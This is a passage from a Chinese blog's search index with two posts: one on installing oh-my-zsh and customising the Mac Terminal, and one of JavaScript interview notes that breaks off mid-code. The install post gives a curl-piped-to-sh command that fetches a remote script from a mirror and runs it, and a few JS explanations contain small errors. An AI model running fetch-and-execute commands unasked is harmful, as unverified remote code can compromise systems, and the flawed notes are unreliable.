<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安装oh-my-zsh和code</title>
      <link href="2021/04/27/%E5%AE%89%E8%A3%85oh-my-zsh%E5%92%8Ccode/"/>
      <url>2021/04/27/%E5%AE%89%E8%A3%85oh-my-zsh%E5%92%8Ccode/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>目前Mac自带的终端不是很好用，好多常规的Linux命令都不支持 比如：ll命令；那么我们可以安装第三方的终端</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>国内地址：  </p><blockquote><p> sh -c “$(curl -fsSL <a href="https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)&quot;" target="_blank" rel="noopener">https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)&quot;</a></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7b86f0qj30nv0dc0uv.jpg" alt="img">  </p><p>使用效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7h4xvqsj314e0mckjl.jpg" alt="image-20210415101051467">  </p><p>后续如果安装其他的命令需要更改zsh环境变量的话 输入如下命令：</p><blockquote><p> vim ~/.zshrc</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7dxlmw4j30kc02ydgp.jpg" alt="image-20210415100745910">  </p><h2 id="更改终端背景"><a href="#更改终端背景" class="headerlink" title="更改终端背景"></a>更改终端背景</h2><ol><li><p>打开终端偏好设置</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7ibukr5j30ps0l0dn7.jpg" alt="image-20210415101200838">  </p></li><li><p>打开描述文件选中文本</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7jdnukbj30x10u07ht.jpg" alt="image-20210415101300909"></p></li><li><p>点击图像-》点击选取</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7x4igznj30ms0fktdm.jpg" alt="image-20210415102614431">  </p></li><li><p>选取本地图片</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7y1kzodj310m0ow45z.jpg" alt="image-20210415102707977">  </p></li><li><p>如果效果不是很好可以调节字体和背景透明度</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk7zecq2pj30wx0u0ank.jpg" alt="image-20210415102825606"></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk80z715gj30uw0u0b1t.jpg" alt="image-20210415102956481"></p></li><li><p>整体效果如下</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpk877m96bj313q0munpd.jpg" alt="WX20210415-103528@2x"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 终端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS基础面试题</title>
      <link href="2021/04/27/JS%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>2021/04/27/JS%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="（2）问：0-1-0-2-0-3-嘛？为什么？"><a href="#（2）问：0-1-0-2-0-3-嘛？为什么？" class="headerlink" title="（2）问：0.1 + 0.2 === 0.3 嘛？为什么？"></a>（2）问：0.1 + 0.2 === 0.3 嘛？为什么？</h2><p>JavaScirpt 使用 Number 类型来表示数字（整数或浮点数），遵循 IEEE 754 标准，通过 64 位来表示一个数字（1 + 11 + 52）</p><ul><li>1 符号位，0 表示正数，1 表示负数 s</li><li>11 指数位（e）</li><li>52 尾数，小数部分（即有效数字）</li></ul><p>最大安全数字：Number.MAX_SAFE_INTEGER = Math.pow(2, 53) - 1，转换成整数就是 16 位，所以 0.1 === 0.1，是因为通过 toPrecision(16) 去有效位之后，两者是相等的。</p><p>在两数相加时，会先转换成二进制，0.1 和 0.2 转换成二进制的时候尾数会发生无限循环，然后进行对阶运算，JS 引擎对二进制进行截断，所以造成精度丢失。</p><p>所以总结：<strong>精度丢失可能出现在进制转换和对阶运算中</strong></p><h2 id="（4）问：JS-数据类型"><a href="#（4）问：JS-数据类型" class="headerlink" title="（4）问：JS 数据类型"></a>（4）问：JS 数据类型</h2><p>基本类型：Number、Boolean、String、null、undefined、symbol（ES6 新增的），BigInt（ES2020） 引用类型：Object，对象子类型（Array，Function）</p><h2 id="问：JS-整数是怎么表示的？"><a href="#问：JS-整数是怎么表示的？" class="headerlink" title="问：JS 整数是怎么表示的？"></a>问：JS 整数是怎么表示的？</h2><ul><li>通过 Number 类型来表示，遵循 IEEE754 标准，通过 64 位来表示一个数字，（1 + 11 + 52），最大安全数字是 Math.pow(2, 53) - 1，对于 16 位十进制。（符号位 + 指数位 + 小数部分有效位）</li></ul><h2 id="问：Number-的存储空间是多大？如果后台发送了一个超过最大自己的数字怎么办"><a href="#问：Number-的存储空间是多大？如果后台发送了一个超过最大自己的数字怎么办" class="headerlink" title="问：Number() 的存储空间是多大？如果后台发送了一个超过最大自己的数字怎么办"></a>问：Number() 的存储空间是多大？如果后台发送了一个超过最大自己的数字怎么办</h2><p>Math.pow(2, 53) ，53 为有效数字，会发生截断，等于 JS 能支持的最大数字。</p><h2 id="（4）写代码：实现函数能够深度克隆基本类型"><a href="#（4）写代码：实现函数能够深度克隆基本类型" class="headerlink" title="（4）写代码：实现函数能够深度克隆基本类型"></a>（4）写代码：实现函数能够深度克隆基本类型</h2><p>浅克隆：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">shallowClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> cloneObj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>    cloneObj<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> cloneObj<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>深克隆：</p><ul><li>考虑基础类型</li><li>引用类型</li><li>RegExp、Date、函数 不是 JSON 安全的</li><li>会丢失 constructor，所有的构造函数都指向 Object</li><li>破解循环引用</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">deepCopy</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">?</span> <span class="token function">deepCopy</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> obj<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="问：事件流"><a href="#问：事件流" class="headerlink" title="问：事件流"></a>问：事件流</h2><p>事件流是网页元素接收事件的顺序，”DOM2级事件”规定的事件流包括三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段。首先发生的事件捕获，为截获事件提供机会。然后是实际的目标接受事件。最后一个阶段是时间冒泡阶段，可以在这个阶段对事件做出响应。虽然捕获阶段在规范中规定不允许响应事件，但是实际上还是会执行，所以有两次机会获取到目标对象。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>事件冒泡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>parEle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>我是父元素    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sonEle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>我是子元素<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> sonEle <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'sonEle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> parEle <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'parEle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>parEle<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'父级 冒泡'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>parEle<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'父级 捕获'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sonEle<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'子级冒泡'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sonEle<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'子级捕获'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当容器元素及嵌套元素，即在<code>捕获阶段</code>又在<code>冒泡阶段</code>调用事件处理程序时：<strong>事件按DOM事件流的顺序</strong>执行事件处理程序：</p><ul><li>父级捕获</li><li>子级冒泡</li><li>子级捕获</li><li>父级冒泡</li></ul><p>且当事件处于目标阶段时，事件调用顺序决定于绑定事件的<strong>书写顺序</strong>，按上面的例子为，先调用冒泡阶段的事件处理程序，再调用捕获阶段的事件处理程序。依次alert出“子集冒泡”，“子集捕获”。</p><h3 id="IE-兼容"><a href="#IE-兼容" class="headerlink" title="IE 兼容"></a>IE 兼容</h3><ul><li>attchEvent(‘on’ + type, handler)</li><li>detachEvent(‘on’ + type, handler)</li></ul><h2 id="问：事件是如何实现的？"><a href="#问：事件是如何实现的？" class="headerlink" title="问：事件是如何实现的？"></a>问：事件是如何实现的？</h2><p>基于发布订阅模式，就是在浏览器加载的时候会读取事件相关的代码，但是只有实际等到具体的事件触发的时候才会执行。</p><p>比如点击按钮，这是个事件（Event），而负责处理事件的代码段通常被称为事件处理程序（Event Handler），也就是「启动对话框的显示」这个动作。</p><p>在 Web 端，我们常见的就是 DOM 事件：</p><ul><li>DOM0 级事件，直接在 html 元素上绑定 on-event，比如 onclick，取消的话，dom.onclick = null，同一个事件只能有一个处理程序，后面的会覆盖前面的。</li><li>DOM2 级事件，通过 addEventListener 注册事件，通过 removeEventListener 来删除事件，一个事件可以有多个事件处理程序，按顺序执行，捕获事件和冒泡事件</li><li>DOM3级事件，增加了事件类型，比如 UI 事件，焦点事件，鼠标事件</li></ul><h2 id="问：new-一个函数发生了什么"><a href="#问：new-一个函数发生了什么" class="headerlink" title="问：new 一个函数发生了什么"></a>问：new 一个函数发生了什么</h2><p>构造调用：</p><ul><li>创造一个全新的对象</li><li>这个对象会被执行 [[Prototype]] 连接，将这个新对象的 [[Prototype]] 链接到这个构造函数.prototype 所指向的对象</li><li>这个新对象会绑定到函数调用的 this</li><li>如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象</li></ul><h2 id="问：new-一个构造函数，如果函数返回-return-、-return-null-，-return-1-，-return-true-会发生什么情况？"><a href="#问：new-一个构造函数，如果函数返回-return-、-return-null-，-return-1-，-return-true-会发生什么情况？" class="headerlink" title="问：new 一个构造函数，如果函数返回 return {} 、 return null ， return 1 ， return true 会发生什么情况？"></a>问：new 一个构造函数，如果函数返回 <code>return {}</code> 、 <code>return null</code> ， <code>return 1</code> ， <code>return true</code> 会发生什么情况？</h2><p>如果函数返回一个对象，那么new 这个函数调用返回这个函数的返回对象，否则返回 new 创建的新对象</p><h2 id="问：symbol-有什么用处"><a href="#问：symbol-有什么用处" class="headerlink" title="问：symbol 有什么用处"></a>问：<code>symbol</code> 有什么用处</h2><p>可以用来表示一个独一无二的变量防止命名冲突。但是面试官问还有吗？我没想出其他的用处就直接答我不知道了，还可以利用 <code>symbol</code> 不会被常规的方法（除了 <code>Object.getOwnPropertySymbols</code> 外）遍历到，所以可以用来模拟私有变量。</p><p>主要用来提供遍历接口，布置了 <code>symbol.iterator</code> 的对象才可以使用 <code>for···of</code> 循环，可以统一处理数据结构。调用之后回返回一个遍历器对象，包含有一个 next 方法，使用 next 方法后有两个返回值 value 和 done 分别表示函数当前执行位置的值和是否遍历完毕。</p><p>Symbol.for() 可以在全局访问 symbol</p><h2 id="（3）问：闭包是什么？"><a href="#（3）问：闭包是什么？" class="headerlink" title="（3）问：闭包是什么？"></a>（3）问：闭包是什么？</h2><p>闭包是指有权访问另外一个函数作用域中的变量的函数</p><p>JavaScript代码的整个执行过程，分为两个阶段，代码编译阶段与代码执行阶段。编译阶段由编译器完成，将代码翻译成可执行代码，这个阶段作用域规则会确定。执行阶段由引擎完成，主要任务是执行可执行代码，执行上下文在这个阶段创建。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gptg8nwgjaj30u00bbgm7.jpg" alt="图片">image.png</p><h3 id="什么是作用域？"><a href="#什么是作用域？" class="headerlink" title="什么是作用域？"></a>什么是作用域？</h3><p>ES5 中只存在两种作用域：全局作用域和函数作用域。在 JavaScript 中，我们将作用域定义为一套规则，这套规则用来管理引擎如何在当前作用域以及嵌套子作用域中根据标识符名称进行变量（变量名或者函数名）查找</p><h3 id="什么是作用域链？"><a href="#什么是作用域链？" class="headerlink" title="什么是作用域链？"></a>什么是作用域链？</h3><p>首先要了解作用域链，当访问一个变量时，编译器在执行这段代码时，会首先从当前的作用域中查找是否有这个标识符，如果没有找到，就会去父作用域查找，如果父作用域还没找到继续向上查找，直到全局作用域为止,，而作用域链，就是有当前作用域与上层作用域的一系列变量对象组成，它保证了当前执行的作用域对符合访问权限的变量和函数的有序访问。</p><h3 id="闭包产生的本质"><a href="#闭包产生的本质" class="headerlink" title="闭包产生的本质"></a>闭包产生的本质</h3><p>当前环境中存在指向父级作用域的引用</p><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>闭包是一种特殊的对象，它由两部分组成：执行上下文（代号 A），以及在该执行上下文中创建的函数 （代号 B），当 B 执行时，如果访问了 A 中变量对象的值，那么闭包就会产生，且在 Chrome 中使用这个执行上下文 A 的函数名代指闭包。</p><h3 id="一般如何产生闭包"><a href="#一般如何产生闭包" class="headerlink" title="一般如何产生闭包"></a>一般如何产生闭包</h3><ul><li>返回函数</li><li>函数当做参数传递</li></ul><h3 id="闭包的应用场景"><a href="#闭包的应用场景" class="headerlink" title="闭包的应用场景"></a>闭包的应用场景</h3><ul><li>柯里化 bind</li><li>模块</li></ul><h2 id="问：NaN-是什么，用-typeof-会输出什么？"><a href="#问：NaN-是什么，用-typeof-会输出什么？" class="headerlink" title="问：NaN 是什么，用 typeof 会输出什么？"></a>问：NaN 是什么，用 typeof 会输出什么？</h2><p>Not a Number，表示非数字，typeof NaN === ‘number’</p><h2 id="（2）问：JS-隐式转换，显示转换"><a href="#（2）问：JS-隐式转换，显示转换" class="headerlink" title="（2）问：JS 隐式转换，显示转换"></a>（2）问：JS 隐式转换，显示转换</h2><p>一般非基础类型进行转换时会先调用 valueOf，如果 valueOf 无法返回基本类型值，就会调用 toString</p><h3 id="字符串和数字"><a href="#字符串和数字" class="headerlink" title="字符串和数字"></a>字符串和数字</h3><ul><li>“+” 操作符，如果有一个为字符串，那么都转化到字符串然后执行字符串拼接</li><li>“-“ 操作符，转换为数字，相减 (-a, a * 1 a/1) 都能进行隐式强制类型转换</li></ul><pre><code>[] + {} 和 {} + []</code></pre><h3 id="布尔值到数字"><a href="#布尔值到数字" class="headerlink" title="布尔值到数字"></a>布尔值到数字</h3><ul><li>1 + true = 2</li><li>1 + false = 1</li></ul><h3 id="转换为布尔值"><a href="#转换为布尔值" class="headerlink" title="转换为布尔值"></a>转换为布尔值</h3><ul><li>for 中第二个</li><li>while</li><li>if</li><li>三元表达式</li><li>|| （逻辑或） &amp;&amp; （逻辑与）左边的操作数</li></ul><h3 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h3><ul><li>不能被转换为数字</li><li>能被转换为布尔值（都是 true）</li><li>可以被转换成字符串 “Symbol(cool)”</li></ul><h3 id="宽松相等和严格相等"><a href="#宽松相等和严格相等" class="headerlink" title="宽松相等和严格相等"></a>宽松相等和严格相等</h3><p>宽松相等允许进行强制类型转换，而严格相等不允许</p><h4 id="字符串与数字"><a href="#字符串与数字" class="headerlink" title="字符串与数字"></a>字符串与数字</h4><p>转换为数字然后比较</p><h4 id="其他类型与布尔类型"><a href="#其他类型与布尔类型" class="headerlink" title="其他类型与布尔类型"></a>其他类型与布尔类型</h4><ul><li>先把布尔类型转换为数字，然后继续进行比较</li></ul><h4 id="对象与非对象"><a href="#对象与非对象" class="headerlink" title="对象与非对象"></a>对象与非对象</h4><ul><li>执行对象的 ToPrimitive(对象）然后继续进行比较</li></ul><h4 id="假值列表"><a href="#假值列表" class="headerlink" title="假值列表"></a>假值列表</h4><ul><li>undefined</li><li>null</li><li>false</li><li>+0, -0, NaN</li><li>“”</li></ul><h2 id="（2）问：了解-this-嘛，bind，call，apply-具体指什么"><a href="#（2）问：了解-this-嘛，bind，call，apply-具体指什么" class="headerlink" title="（2）问：了解 this 嘛，bind，call，apply 具体指什么"></a>（2）问：了解 this 嘛，bind，call，apply 具体指什么</h2><p>它们都是函数的方法</p><p><code>call: Array.prototype.call(this, args1, args2])</code> <code>apply: Array.prototype.apply(this, [args1, args2])</code> ：ES6 之前用来展开数组调用, <code>foo.appy(null, [])</code>，ES6 之后使用 … 操作符</p><ul><li>New 绑定 &gt; 显示绑定 &gt; 隐式绑定 &gt; 默认绑定</li><li>如果需要使用 bind 的柯里化和 apply 的数组解构，绑定到 null，尽可能使用 Object.create(null) 创建一个 DMZ 对象</li></ul><p>四条规则：</p><ul><li>默认绑定，没有其他修饰（bind、apply、call)，在非严格模式下定义指向全局对象，在严格模式下定义指向 undefined</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>隐式绑定：调用位置是否有上下文对象，或者是否被某个对象拥有或者包含，那么隐式绑定规则会把函数调用中的 this 绑定到这个上下文对象。而且，对象属性链只有上一层或者说最后一层在调用位置中起作用</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  a<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>  foo<span class="token punctuation">:</span> foo<span class="token punctuation">,</span><span class="token punctuation">}</span>obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>显示绑定：通过在函数上运行 call 和 apply ，来显示的绑定 this</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  a<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">;</span>foo<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显示绑定之硬绑定</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>something<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">,</span> something<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">+</span> something<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bind</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> fn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  a<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token keyword">var</span> bar <span class="token operator">=</span> <span class="token function">bind</span><span class="token punctuation">(</span>foo<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>New 绑定，new 调用函数会创建一个全新的对象，并将这个对象绑定到函数调用的 this。</p><ul><li>New 绑定时，如果是 new 一个硬绑定函数，那么会用 new 新建的对象替换这个硬绑定 this，</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> bar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（4）问：手写-bind、apply、call"><a href="#（4）问：手写-bind、apply、call" class="headerlink" title="（4）问：手写 bind、apply、call"></a>（4）问：手写 bind、apply、call</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// call</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>call <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  context <span class="token operator">=</span> context <span class="token operator">||</span> window<span class="token punctuation">;</span>  <span class="token keyword">const</span> fnSymbol <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">"fn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token 